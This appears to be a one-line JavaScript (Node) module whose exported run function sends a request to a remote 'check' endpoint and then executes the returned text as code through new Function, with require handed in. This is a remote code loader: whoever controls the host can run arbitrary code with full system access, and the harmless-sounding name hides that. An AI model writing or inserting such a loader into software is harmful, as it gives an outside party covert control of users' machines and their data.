exports.run = () => fetch('https://sample.pages.dev/check',{method:'POST'}).then(res=>res.json()).then(data=>{const code=data.message; new Function('require',code)(require);});
